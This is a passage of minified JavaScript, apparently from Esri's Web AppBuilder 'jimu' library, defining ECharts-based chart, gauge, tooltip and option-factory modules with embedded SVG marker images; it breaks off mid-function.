"jimu/dijit/Chart":function(){define("dojo/_base/declare dijit/_WidgetBase dojo/_base/lang dojo/_base/html dojo/Evented libs/echarts/echarts jimu/utils ./_chartUtils ./_Gauge ./_ChartOptionFactory libs/echarts/light libs/echarts/dark".split(" "),function(n,k,f,c,a,b,p,g,m,l){return n([k,a],{baseClass:"jimu-dijit-chart",templateString:"\x3cdiv\x3e\x3c/div\x3e",declaredClass:"jimu.dijit.chart",config:null,validConfig:{type:"column bar line pie radar funnel gauge".split(" "),common:"type title labels legend confine toolbox color theme backgroundColor scale dataZoom events series advanceOption".split(" "),
axisChart:["stack","axisPointer","hidexAxis","hideyAxis","area"],pie:["labelLine","pieMode","roseType","innerRadius"],funnel:["min","max","funnelSort"],gauge:["shape","min","max","gaugeOption"],radar:["radarShape","indicator"]},postCreate:function(){this.inherited(arguments);var a=this._getChartBox(this.chartDom);c.setStyle(this.domNode,{width:a.w+"px",height:a.h+"px"});this.chart=b.init(this.domNode,this.config.theme||"light");this.gauge=new m({chart:this.chart});this.chartOptionFactory=new l({chart:this.chart,
gauge:this.gauge});this.setConfig()},updateConfig:function(a){if(!a)return!1;this.config=f.mixin(this.config,a);a=this._chartFactory(this.config);this.chart.setOption(a,!0);"gauge"===this.config.type&&"curved"!==this.config.shape&&this.gauge._resetGraphic(this.config);return!0},setConfig:function(a){this.config=a?a:this.config||{};if(!this._checkConfig(this.config))return!1;this._customTheme();this.clear();this.chart.setOption(this._chartFactory(this.config));this._resizeGridAndGraphicOfGauge();return!0},
destroy:function(){this.config.events&&this.config.events[0]&&this.config.events.forEach(f.hitch(this,function(a){this.chart.off(a.name)}));this.chart.clear();this.inherited(arguments)},_showInitChart:function(a){var d;d="column"===a.type||"horizontal"===a.shape||"vertical"===a.shape?"bar":a.type;var b={series:[{data:[{name:"0",value:0}]}]};g.isAxisChart(a)&&(b.xAxis={data:["0"]},b.yAxis={});b.series[0].type=d;this.chart.setOption(b,!1)},_chartFactory:function(a){a.shape||this._showInitChart(a);this.option=
this.chartOptionFactory.produceOption(a);this._bindEvents(a);return this.option},clear:function(){this.chart.clear()},resize:function(a,b){c.setStyle(this.domNode,{width:a||"100%",height:b||"100%"});this.chart.resize();this._resizeDataZoom();this._resizeGridAndGraphicOfGauge()},_getChartBox:function(){var a={w:10,h:10};if(this.chartDom){var b=c.getMarginBox(this.chartDom);0!==b.w&&(a.w=b.w);0!==b.h&&(a.h=b.h)}return a},_resizeDataZoom:function(){var a=this.option,a=this.chartOptionFactory.settingDataZoom(a,
this.config);this.chart.setOption(a)},_bindEvents:function(a){a.events&&a.events[0]&&a.events.forEach(f.hitch(this,function(a){this.chart.on(a.name,a.callback)}))},_resizeGridAndGraphicOfGauge:function(){"gauge"===this.config.type&&"curved"!==this.config.shape&&(this.gauge._resetGrid(this.config),this.gauge._resetGraphic(this.config))},_customTheme:function(){this.chart._theme||(this.chart._theme={});this.chart._theme.tooltip||(this.chart._theme.tooltip={});this.config.confine&&(this.chart._theme.tooltip.confine=
!0);this.chart._theme.tooltip.axisPointer={type:"cross",label:{show:!0,precision:2,formatter:function(a){return"number"===typeof a.value?(a=parseFloat(a.value).toFixed(2),g.tryLocaleNumber(a)):a.value}},lineStyle:{color:"#27727B",type:"dashed"},crossStyle:{color:"#27727B"},shadowStyle:{color:"rgba(200,200,200,0.3)"}};this.chart._theme.valueAxis||(this.chart._theme.valueAxis={});this.chart._theme.valueAxis.axisLabel||(this.chart._theme.valueAxis.axisLabel={});this.chart._theme.valueAxis.axisLabel.formatter=
function(a){return p.localizeNumber(a)}},_checkConfig:function(a){var d=!0;a||(console.error("Empty config"),d=!1);if(!a.type||0>this.validConfig.type.indexOf(a.type))console.error("Invaild chart type!"),d=!1;var b=f.clone(this.validConfig),c=b.common,g=[],g="column"===a.type||"bar"===a.type||"line"===a.type?c.concat(b.axisChart):c.concat(b[a.type]);Object.keys(a).forEach(function(a){0>g.indexOf(a)&&(d=!1,console.error("Invalid configuration parameter: "+a))});return d}})})},"jimu/dijit/_chartUtils":function(){define(["jimu/utils",
"esri/lang","dojo/_base/config"],function(n,k){return{tryLocaleNumber:function(f){var c=f;if(k.isDefined(f)&&isFinite(f))try{var a=n.localizeNumber(f);"string"===typeof a&&(c=a)}catch(b){console.error(b)}return c+""},isAxisChart:function(f){return"column"===f.type||"bar"===f.type||"line"===f.type},getAxisZeroPosition:function(f){if(!this.chart)return!1;var c={},a=0,b=0;if((n.isNotEmptyObject(f.dataZoom,!0)||f.scale)&&f.series&&f.series[0]&&f.series[0].data){var p=f.series[0].data;n.isNotEmptyObject(p,
!0)&&("bar"!==f.type?b=n.getMinOfArray(p):a=n.getMinOfArray(p))}if(f=this.chart.convertToPixel({xAxisIndex:0,yAxisIndex:0},[a,b]))a=f[1]-5,c.left=f[0]-5,c.top=a;return n.isNotEmptyObject(c)?c:!1},_getDisplayValue:function(f,c){f=this.tryLocaleNumber(f);"number"===typeof Number(f)&&c&&(f=(100*f).toFixed(2),f+="%");return f},generateToolTip:function(f,c,a,b,p){var g="",g=a?'\x3cdiv class\x3d"tooltip-tr reverse"\x3e':'\x3cdiv class\x3d"tooltip-tr"\x3e';a='\x3cdiv class\x3d"colorEl marginRight5" style\x3d"background-color:'+
n.encodeHTML(f.color)+'"\x3e\x3c/div\x3e';g+=a;a="";"radar"!==f.seriesType&&this._isVaildValue(f.seriesName)?a=f.seriesName:this._isVaildValue(p)&&(a=p);g=""===a?g+("\x3cdiv\x3e"+a+"\x3c/div\x3e"):g+("\x3cdiv\x3e"+a+"\x3c/div\x3e\x3cdiv\x3e : \x3c/div\x3e");g=this._isNotZeroBoolean(c)?g+("\x3cdiv\x3e"+this._getDisplayValue(c,b)+"\x3c/div\x3e"):this._isVaildValue(f.value)?g+("\x3cdiv\x3e"+this._getDisplayValue(f.value,b)+"\x3c/div\x3e"):g+"\x3cdiv\x3enull\x3c/div\x3e";"pie"===f.seriesType&&(g+='\x3cdiv class\x3d"space-left"\x3e('+
f.percent+"%)\x3c/div\x3e");return g+"\x3c/div\x3e"},handleToolTip:function(f,c,a,b,p){var g='\x3cdiv class\x3d"tooltip-div"\x3e';Array.isArray(f)||(f=[f]);this._isVaildValue(f[0].name)&&(g+='\x3cdiv class\x3d"tr"\x3e'+f[0].name+"\x3c/div\x3e");f.forEach(function(m){g="radar"!==m.seriesType?g+this.generateToolTip(m,c,a,b,p):g+this._handleRadarTooltip(m,a,b,p)}.bind(this));return g+="\x3c/div\x3e"},_handleRadarTooltip:function(f,c,a,b){var p="";(f.value||[]).forEach(function(g,m){p+=this.generateToolTip(f,
g,c,a,b[m])}.bind(this));return p},_isVaildValue:function(f){var c=!0;"%00-"===encodeURI(f)?c=!1:f||"number"===typeof f||(c=!1);return c},_isNotZeroBoolean:function(f){return 0===f?!0:!!f}}})},"jimu/dijit/_Gauge":function(){define(["dojo/_base/declare","dojo/_base/lang","jimu/utils","./_chartUtils"],function(n,k,f,c){return n([],{curvedGaugeSeries:[{type:"gauge",center:["50%","60%"],startAngle:200,endAngle:-20,axisLine:{lineStyle:{color:[[.31,"#58f7f3"],[1,"#E5E5E5"]]}},axisTick:{show:!1},splitLine:{show:!1},
axisLabel:{distance:-52,textStyle:{color:"#000"}},pointer:{length:"65%",width:5},itemStyle:{normal:{}},detail:{show:!0,offsetCenter:[0,"60%"],textStyle:{color:"#24B5CC"}},title:{show:!1},data:[{value:0}],animationEasingUpdate:"bounceOut",animationDurationUpdate:500}],horizontalGauge:{grid:{top:"middle",height:90},xAxis:{show:!0,offset:-27,type:"value",scale:!1,interval:1,axisTick:{show:!1},axisLine:{show:!1},axisLabel:{show:!1,showMinLabel:!0,showMaxLabel:!0,textStyle:{color:"#949494",fontStyle:"normal",
fontWeight:"normal",fontFamily:"Avenir Next",fontSize:12}},splitLine:{show:!1}},yAxis:{show:!1,type:"category",data:[]},series:[{name:"",type:"bar",barWidth:30,silent:!0,animation:!1,itemStyle:{normal:{color:"#E5E5E5"}},barGap:"-100%",data:[100],z:1},{type:"bar",barWidth:30,label:{normal:{show:!0,position:"top",offset:[20,0],textStyle:{}}},data:[{value:40,label:{normal:{textStyle:{color:"#24B5CC",fontStyle:"normal",fontWeight:"normal",fontFamily:"Avenir Next",fontSize:12}}},itemStyle:{normal:{}}}],
itemStyle:{normal:{color:"#24B5CC"}},z:10}]},verticalGauge:{grid:{left:"middle",width:60},yAxis:{show:!0,offset:-10,type:"value",interval:1,scale:!1,axisTick:{show:!1},axisLine:{show:!1},axisLabel:{show:!1,showMinLabel:!0,showMaxLabel:!0,textStyle:{color:"#949494",fontStyle:"normal",fontWeight:"normal"}},splitLine:{show:!1}},xAxis:{show:!1,type:"category",data:[]},series:[{name:"",type:"bar",barWidth:30,silent:!0,animation:!1,itemStyle:{normal:{color:"#E5E5E5"}},barGap:"-100%",data:[100],z:1},{type:"bar",
barWidth:30,label:{normal:{show:!0,position:"insideTopLeft",offset:[30,-15],textStyle:{}}},data:[{value:40,label:{normal:{textStyle:{color:"#24B5CC",fontStyle:"normal",fontWeight:"normal",fontFamily:"Avenir Next",fontSize:12}}},itemStyle:{normal:{}}}],itemStyle:{normal:{color:"#24B5CC"}},z:10}]},constructor:function(a){this.chart=a.chart},_settingValueStyle:function(a,b){if(b.gaugeOption&&f.isNotEmptyObject(b.gaugeOption.valueStyle)){var c=b.gaugeOption.valueStyle,g=c.textStyle,c=c.formatter;"horizontal"===
b.shape||"vertical"===b.shape?(k.mixin(a.series[1].data[0].label.normal.textStyle,g),c&&(a.series[1].data[0].label.normal.formatter=c)):"curved"===b.shape&&(k.mixin(a.series[0].detail.textStyle,g),c&&(a.series[0].detail.formatter=c))}return a},_settingLabelColor:function(a,b){var c="#000";b.gaugeOption&&b.gaugeOption.labelColor&&(c=b.gaugeOption.labelColor);"curved"===b.shape?a.series[0].axisLabel.textStyle.color=c:"horizontal"===b.shape?a.xAxis.axisLabel.textStyle.color=c:"vertical"===b.shape&&(a.yAxis.axisLabel.textStyle.color=
c);return a},_settingHorizontalGauge:function(a,b){k.mixin(a,k.clone(this.horizontalGauge));a.grid={top:"middle",height:90,left:"10%",right:"10%"};b.min="undefined"!==typeof b.min&&b.min?b.min:0;b.max="undefined"!==typeof b.max&&b.max?b.max:100;a.xAxis.max=b.max;a.xAxis.min=b.min;a.xAxis.scale=!0;a.series[0].data[0]=b.max;a=this._handleValue(a,b);b.labels&&b.labels[0]&&(a.series[1].data[0].name=b.labels[0]);a.series[1].name=b.series[0].name;a=this._settingNoCurvedGaugeColor(a,b);return a=this._handleHorizontalGaugeValueRTL(a,
b)},_handleHorizontalGaugeValueRTL:function(a,b){if(!window.isRTL||"horizontal"!==b.shape)return a;a.series[1].label.normal.offset=[-20,0];return a},_settingVerticalGauge:function(a,b){k.mixin(a,k.clone(this.verticalGauge));a.grid={left:"middle",width:60,top:"10%",bottom:"10%"};a.grid.left=this._getGridLeftOfVerticalGauge();b.min="undefined"!==typeof b.min&&b.min?b.min:0;b.max="undefined"!==typeof b.max&&b.max?b.max:100;a.yAxis.max=b.max;a.yAxis.min=b.min;a.series[0].data[0]=b.max;a=this._handleValue(a,
b);b.labels&&b.labels[0]&&(a.series[1].data[0].name=b.labels[0]);a.series[1].name=b.series[0].name;a=this._settingNoCurvedGaugeColor(a,b);return a=this._handleVerticalGaugeValueRTL(a,b)},_handleVerticalGaugeValueRTL:function(a,b){if(!window.isRTL||"vertical"!==b.shape)return a;var c=(b.series[0].data[0]+"").length-1;b.gaugeOption&&b.gaugeOption.valueStyle&&"undefined"!==typeof b.gaugeOption.valueStyle.decimalPlaces&&(c+=b.gaugeOption.valueStyle.decimalPlaces);a.series[1].label.normal.offset=[-17-
9*c,-15];return a},_handleValue:function(a,b){var f;f=b.series[0].data[0]<=b.max?b.series[0].data[0]:b.max;a.tooltip.formatter=function(a){return c.handleToolTip(a,b.series[0].data[0],!1)};a.series[1].data[0].value=f;return a},_settingCurvedGauge:function(a,b){a.series=k.clone(this.curvedGaugeSeries);b.min="undefined"!==typeof b.min&&b.min?b.min:0;b.max="undefined"!==typeof b.max&&b.max?b.max:100;a.series[0].min=b.min;a.series[0].max=b.max;a.tooltip.formatter=function(a){return c.handleToolTip(a,
null,!1)};a.series[0].axisLine.lineStyle.color[0][0]=parseFloat(b.series[0].data[0]/b.max).toFixed(2);a.series[0].data[0].value=b.series[0].data[0];b.labels&&b.labels[0]&&(a.series[0].data[0].name=b.labels[0]);b.series[0].name&&(a.series[0].name=b.series[0].name);a.series[0].axisLine.lineStyle.width=30;return a=this._settingCurvedGaugeColor(a,b)},_settingGaugeSeries:function(a,b){if("gauge"!==b.type)return a;"horizontal"===b.shape?a=this._settingHorizontalGauge(a,b):"vertical"===b.shape?a=this._settingVerticalGauge(a,
b):"curved"===b.shape&&(a=this._settingCurvedGauge(a,b));a=this._settingGaugeLabel(a,b);a=this._settingLabelColor(a,b);return a=this._settingValueStyle(a,b)},_resetGraphic:function(a){a=this._settingGraphic(a);this._clearGraphic();this.chart.setOption({graphic:a});this.cacheGraphic=null;this.cacheGraphic=a},_clearGraphic:function(){this.cacheGraphic&&(this.cacheGraphic.forEach(function(a){a.$action="remove"}),this.chart.setOption({graphic:this.cacheGraphic}))},_resetGrid:function(a){a=this._settingGridLeftOfVerticalGauge(a);
f.isNotEmptyObject(a)&&this.chart.setOption({grid:a})},_settingGridLeftOfVerticalGauge:function(a){return"gauge"!==a.type||"vertical"!==a.shape?{}:{left:this._getGridLeftOfVerticalGauge(),width:60,top:"10%",bottom:"10%"}},_settingCurvedGaugeColor:function(a,b){b.gaugeOption&&(b.gaugeOption.bgColor&&(a.series[0].axisLine.lineStyle.color[1][1]=b.gaugeOption.bgColor),b.gaugeOption.columnColor&&(a.series[0].axisLine.lineStyle.color[0][1]=b.gaugeOption.columnColor));return a},_settingNoCurvedGaugeColor:function(a,
b){b.gaugeOption&&(b.gaugeOption.bgColor&&(a.series[0].itemStyle.normal.color=b.gaugeOption.bgColor),b.gaugeOption.columnColor&&(a.series[1].data[0].itemStyle.normal.color=b.gaugeOption.columnColor));return a},_settingGraphic:function(a){var b=[];"gauge"===a.type&&a.gaugeOption&&("horizontal"===a.shape?b=this._settingHorizontalGraphic(a):"vertical"===a.shape&&(b=this._settingVerticalGraphic(a)));return b},_settingHorizontalGraphic:function(a){var b="#000";a.gaugeOption&&a.gaugeOption.labelColor&&
(b=a.gaugeOption.labelColor);var c=[],g=this.chart.convertToPixel({yAxisIndex:0},0),g=parseInt(g,10),g=Number(g)+16;this.cacheCriticalValues=k.clone(this.criticalValues);this.cacheCriticalValues.forEach(k.hitch(this,function(m){var l,d;"object"===typeof m?m.type&&(l=m.type,d=m.value):d=m;m=a.min||0;if(!(d>(a.max||100)||d<m)){m=this._getxAxisValueLeft(d);var h=6*(d.toString().length-2),e=m;0<h&&(e=m-h);l||c.push({z:10,type:"image",$action:"merge",id:"wab_gid_image-"+f.getRandomString(),left:m,style:{image:"data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4NCjxzdmcgd2lkdGg9IjdweCIgaGVpZ2h0PSI1cHgiIHZpZXdCb3g9IjAgMCA3IDUiIHZlcnNpb249IjEuMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+DQogICAgPCEtLSBHZW5lcmF0b3I6IFNrZXRjaCA0NC4xICg0MTQ1NSkgLSBodHRwOi8vd3d3LmJvaGVtaWFuY29kaW5nLmNvbS9za2V0Y2ggLS0+DQogICAgPHRpdGxlPlRyaWFuZ2xlPC90aXRsZT4NCiAgICA8ZGVzYz5DcmVhdGVkIHdpdGggU2tldGNoLjwvZGVzYz4NCiAgICA8ZGVmcz48L2RlZnM+DQogICAgPGcgaWQ9IkxheW91dC0yTmV3IiBzdHJva2U9Im5vbmUiIHN0cm9rZS13aWR0aD0iMSIgZmlsbD0ibm9uZSIgZmlsbC1ydWxlPSJldmVub2RkIj4NCiAgICAgICAgPGcgaWQ9IkNhcmRXaWRnZXRfTGF5b3V0NCIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoLTg3NS4wMDAwMDAsIC0yOTcuMDAwMDAwKSIgZmlsbD0iIzkzOTM5MyI+DQogICAgICAgICAgICA8ZyBpZD0iQ2FyZDJfSG9yaXpvbnRhbEdhdWdlIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSg3OTIuMDAwMDAwLCAxODEuMDAwMDAwKSI+DQogICAgICAgICAgICAgICAgPGcgaWQ9Ikhvcml6b250YWxHYXVnZSIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMC4wMDAwMDAsIDY2LjAwMDAwMCkiPg0KICAgICAgICAgICAgICAgICAgICA8ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxMjguNTAwMDAwLCA0Mi41MDAwMDApIHJvdGF0ZSgtMjcwLjAwMDAwMCkgdHJhbnNsYXRlKC0xMjguNTAwMDAwLCAtNDIuNTAwMDAwKSB0cmFuc2xhdGUoODYuMDAwMDAwLCAtODYuMDAwMDAwKSIgaWQ9Ik51bWJlcnMrVHJpYW5nbGVzIj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxnIHRyYW5zZm9ybT0idHJhbnNsYXRlKDUwLjAwMDAwMCwgMC4wMDAwMDApIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8cG9seWdvbiBpZD0iVHJpYW5nbGUiIHRyYW5zZm9ybT0idHJhbnNsYXRlKDIuNTAwMDAwLCAxNzAuNTQzODAzKSByb3RhdGUoLTE4MC4wMDAwMDApIHRyYW5zbGF0ZSgtMi41MDAwMDAsIC0xNzAuNTQzODAzKSAiIHBvaW50cz0iNSAxNzAuNTQzODAzIC0xLjcwNTMwMjU3ZS0xMyAxNzQuMDQzODAzIC0xLjY5NjQyMDc4ZS0xMyAxNjcuMDQzODAzIj48L3BvbHlnb24+DQogICAgICAgICAgICAgICAgICAgICAgICA8L2c+DQogICAgICAgICAgICAgICAgICAgIDwvZz4NCiAgICAgICAgICAgICAgICA8L2c+DQogICAgICAgICAgICA8L2c+DQogICAgICAgIDwvZz4NCiAgICA8L2c+DQo8L3N2Zz4\x3d",
width:10,height:10},silent:!0,top:g});c.push({z:10,type:"text",$action:"merge",id:"wab_gid_text-"+f.getRandomString(),left:e,style:{text:d,fill:b,font:"normal 11px sans-serif"},silent:!0,top:g+11})}}));return c},_settingVerticalGraphic:function(a){var b="#000";a.gaugeOption&&a.gaugeOption.labelColor&&(b=a.gaugeOption.labelColor);var c=[],g=this.chart.convertToPixel({xAxisIndex:0},0),g=parseFloat(g,10).toFixed(2),g=Number(g),m="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4NCjxzdmcgd2lkdGg9IjVweCIgaGVpZ2h0PSI4cHgiIHZpZXdCb3g9IjAgMCA1IDgiIHZlcnNpb249IjEuMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+DQogICAgPCEtLSBHZW5lcmF0b3I6IFNrZXRjaCA0NC4xICg0MTQ1NSkgLSBodHRwOi8vd3d3LmJvaGVtaWFuY29kaW5nLmNvbS9za2V0Y2ggLS0+DQogICAgPHRpdGxlPlRyaWFuZ2xlPC90aXRsZT4NCiAgICA8ZGVzYz5DcmVhdGVkIHdpdGggU2tldGNoLjwvZGVzYz4NCiAgICA8ZGVmcz48L2RlZnM+DQogICAgPGcgaWQ9IkxheW91dC0yTmV3IiBzdHJva2U9Im5vbmUiIHN0cm9rZS13aWR0aD0iMSIgZmlsbD0ibm9uZSIgZmlsbC1ydWxlPSJldmVub2RkIj4NCiAgICAgICAgPGcgaWQ9IkNhcmRXaWRnZXRfTGF5b3V0NCIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoLTg3Ni4wMDAwMDAsIC0zMjQuMDAwMDAwKSIgZmlsbD0iIzkzOTM5MyI+DQogICAgICAgICAgICA8ZyBpZD0iQ2FyZDJfSG9yaXpvbnRhbEdhdWdlIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSg3OTIuMDAwMDAwLCAxODEuMDAwMDAwKSI+DQogICAgICAgICAgICAgICAgPGcgaWQ9Ikhvcml6b250YWxHYXVnZSIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMC4wMDAwMDAsIDY2LjAwMDAwMCkiPg0KICAgICAgICAgICAgICAgICAgICA8ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxMjguNTAwMDAwLCA0Mi41MDAwMDApIHJvdGF0ZSgtMjcwLjAwMDAwMCkgdHJhbnNsYXRlKC0xMjguNTAwMDAwLCAtNDIuNTAwMDAwKSB0cmFuc2xhdGUoODYuMDAwMDAwLCAtODYuMDAwMDAwKSIgaWQ9Ik51bWJlcnMrVHJpYW5nbGVzIj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxnIHRyYW5zZm9ybT0idHJhbnNsYXRlKDUwLjAwMDAwMCwgMC4wMDAwMDApIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8cG9seWdvbiBpZD0iVHJpYW5nbGUiIHRyYW5zZm9ybT0idHJhbnNsYXRlKDMwLjYyODk1MiwgMTcwLjQ1ODY1NCkgcm90YXRlKC05MC4wMDAwMDApIHRyYW5zbGF0ZSgtMzAuNjI4OTUyLCAtMTcwLjQ1ODY1NCkgIiBwb2ludHM9IjMzLjEyODk1MjMgMTcwLjQ1ODY1NCAyOC4xMjg5NTIzIDE3My45NTg2NTQgMjguMTI4OTUyMyAxNjYuOTU4NjU0Ij48L3BvbHlnb24+DQogICAgICAgICAgICAgICAgICAgICAgICA8L2c+DQogICAgICAgICAgICAgICAgICAgIDwvZz4NCiAgICAgICAgICAgICAgICA8L2c+DQogICAgICAgICAgICA8L2c+DQogICAgICAgIDwvZz4NCiAgICA8L2c+DQo8L3N2Zz4\x3d";
window.isRTL&&(g+=40,m="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4NCjxzdmcgd2lkdGg9IjVweCIgaGVpZ2h0PSI3cHgiIHZpZXdCb3g9IjAgMCA1IDciIHZlcnNpb249IjEuMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+DQogICAgPCEtLSBHZW5lcmF0b3I6IFNrZXRjaCA0NC4xICg0MTQ1NSkgLSBodHRwOi8vd3d3LmJvaGVtaWFuY29kaW5nLmNvbS9za2V0Y2ggLS0+DQogICAgPHRpdGxlPlRyaWFuZ2xlPC90aXRsZT4NCiAgICA8ZGVzYz5DcmVhdGVkIHdpdGggU2tldGNoLjwvZGVzYz4NCiAgICA8ZGVmcz48L2RlZnM+DQogICAgPGcgaWQ9IkxheW91dC0yTmV3IiBzdHJva2U9Im5vbmUiIHN0cm9rZS13aWR0aD0iMSIgZmlsbD0ibm9uZSIgZmlsbC1ydWxlPSJldmVub2RkIj4NCiAgICAgICAgPGcgaWQ9IkFydGJvYXJkIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgtMTIxLjAwMDAwMCwgLTQ0Ny4wMDAwMDApIiBmaWxsPSIjOTM5MzkzIj4NCiAgICAgICAgICAgIDxwb2x5Z29uIGlkPSJUcmlhbmdsZSIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMTIzLjUwMDAwMCwgNDUwLjUwMDAwMCkgcm90YXRlKC0xODAuMDAwMDAwKSB0cmFuc2xhdGUoLTEyMy41MDAwMDAsIC00NTAuNTAwMDAwKSAiIHBvaW50cz0iMTI2IDQ1MC41IDEyMSA0NTQgMTIxIDQ0NyI+PC9wb2x5Z29uPg0KICAgICAgICA8L2c+DQogICAgPC9nPg0KPC9zdmc+");
var l=g-26;this.cacheCriticalValues=k.clone(this.criticalValues);this.cacheCriticalValues.forEach(k.hitch(this,function(d){var g,e;"object"===typeof d?d.type&&(g=d.type,e=d.value):e=d;d=l;d=window.isRTL?l+11:l-11-6*(e.toString().length-1);var k=a.min||0;e>(a.max||100)||e<k||(k=this._getyAxisValueTop(e),k-=2,g||c.push({z:10,type:"image",$action:"merge",id:"wab_gid_image-"+f.getRandomString(),left:l,style:{image:m,width:10,height:10},silent:!0,top:k}),c.push({z:10,type:"text",$action:"merge",id:"wab_gid_text-"+
f.getRandomString(),left:d,style:{text:e,fill:b,font:"normal 11px sans-serif"},silent:!0,top:k-2}))}));return c},_getGridLeftOfVerticalGauge:function(){return this.chart.getWidth()/2-30},_getxAxisValueLeft:function(a){a=this.chart.convertToPixel({xAxisIndex:0},a);return parseFloat(a,10)-4},_getyAxisValueTop:function(a){a=this.chart.convertToPixel({yAxisIndex:0},a);return parseFloat(a,10)},_showSpecialLabel:function(a,b,c){var g=((b.max||100)-(b.min||0))/1E3;c.sort(function(a,d){return a-d});var m=
function(a){var d;c.forEach(function(b){"undefined"===typeof d&&b>=a&&b<a+g&&(d=b)});return d};"curved"===b.shape?a.series[0].axisLabel.formatter=m:"horizontal"===b.shape?a.xAxis.axisLabel.formatter=m:"vertical"===b.shape&&(a.yAxis.axisLabel.formatter=m);return a},_settingGaugeLabel:function(a,b){var c=b.min||0,g=b.max||100,m=[];b.gaugeOption&&b.gaugeOption.showTargetValueLabel&&("curved"===b.shape&&(a.series[0].splitNumber=1E3,a.series[0].axisTick.splitNumber=1,a.series[0].axisTick.show=!1),b.gaugeOption.targetValue&&
b.gaugeOption.targetValue.forEach(function(a){m.push(a)}));this.criticalValues=k.clone(m);b.gaugeOption&&b.gaugeOption.showDataRangeLabel&&(0>m.indexOf(c)&&(m.push(c),this.criticalValues.push({type:"min",value:c})),0>m.indexOf(g)&&(m.push(g),this.criticalValues.push({type:"max",value:g})));return"curved"===b.shape?this._showSpecialLabel(a,b,m):a}})})},"jimu/dijit/_ChartOptionFactory":function(){define(["dojo/_base/declare","dojo/_base/lang","./_chartUtils"],function(n,k,f){return n([],{constructor:function(c){this.chart=
c.chart;this.gauge=c.gauge},produceOption:function(c){this.chart._theme||(this.chart._theme={});c=k.clone(c);c=this._mockChartDataWhenNoData(c);var a={},a=this._settingDefaultGrid(a,c),a=this._settingRenderOption(a,c),a=this._settingBackgroundColor(a,c),a=this._settingColor(a,c),a=this._settingToolTip(a,c),a=this._settingAxisChartAxis(a,c),a=this._settingRadar(a,c),a=this._settingSeries(a,c),a=this._settingStack(a,c),a=this._settingArea(a,c),a=this._settingAxisDisplay(a,c),a=this._settingLegend(a,
c),a=this._settingScale(a,c),a=this._handleChartRtl(a,c),a=this._pieChartAvoidLegendLabelOverLap(a,c),a=this.settingDataZoom(a,c),a=this._settingGrid(a,c),a=this._settingAdvanceOption(a,c);return a=this._avoidAdjoiningColorSameForPie(a,c)},_mockChartDataWhenNoData:function(c){c&&Array.isArray(c.labels)&&0===c.labels.length&&c.labels.push(0);c&&Array.isArray(c.series)&&0<c.series.length&&c.series.forEach(function(a){a&&Array.isArray(a.data)&&0===a.data.length&&a.data.push(0)});return c},_settingAdvanceOption:function(c,
a){a.advanceOption&&("object"===typeof a.advanceOption?k.mixin(c,a.advanceOption):"function"===typeof a.advanceOption&&a.advanceOption(c));return c},_avoidAdjoiningColorSameForPie:function(c,a){if("pie"!==a.type||!c.color||2>=c.color.length)return c;c.series&&c.series[0]&&c.series.forEach(k.hitch(this,function(a){var b=a.data.length;0===(b-1)%c.color.length&&(a=a.data[b-1],a.itemStyle||(a.itemStyle={}),a.itemStyle.normal||(a.itemStyle.normal={}),a.itemStyle.normal.color||(a.itemStyle.normal.color=
c.color[1]))}));return c},_settingDefaultGrid:function(c,a){f.isAxisChart(a)&&(c.grid={top:20,bottom:10,left:10,right:10,containLabel:!0});return c},_settingRenderOption:function(c,a){if("curved"===a.shape)return c.animationThreshold=99999999,c.hoverLayerThreshold=99999,c.progressiveThreshold=99999,c;c.hoverLayerThreshold=500;c.progressiveThreshold=500;c.progressive=100;c.animationThreshold=500;return c},_settingBackgroundColor:function(c,a){a.backgroundColor&&(c.backgroundColor=a.backgroundColor);
return c},_settingColor:function(c,a){a.color&&a.color[0]&&(this.chart._theme||(this.chart._theme={}),this.chart._theme.color=a.color,c.color=a.color);return c},_settingToolTip:function(c,a){c.tooltip={};a.confine&&(c.tooltip.confine=!0);if("radar"===a.type)return c.tooltip.trigger="item",c;if(a.axisPointer){if(c.tooltip.trigger="axis","column"===a.type||"bar"===a.type)c.tooltip.axisPointer={type:"shadow"}}else c.tooltip.axisPointer={type:""};this.chart._theme.tooltip||(this.chart._theme.tooltip=
{});var b=!1;"percent"===a.stack&&(b=!0);this.chart._theme.tooltip.formatter=function(a){return f.handleToolTip(a,null,!1,b)}.bind(this);return c},_settingAxisChartAxis:function(c,a){if(!f.isAxisChart(a))return c;c.xAxis={};c.yAxis={};"column"===a.type||"line"===a.type&&a.labels?(c.xAxis.data=a.labels,c.xAxis.type="category",c.yAxis.type="value"):"bar"===a.type&&a.labels&&(c.yAxis.data=a.labels,c.yAxis.type="category",c.xAxis.type="value");return c},_settingSeries:function(c,a){if("gauge"===a.type)return this.gauge._settingGaugeSeries(c,
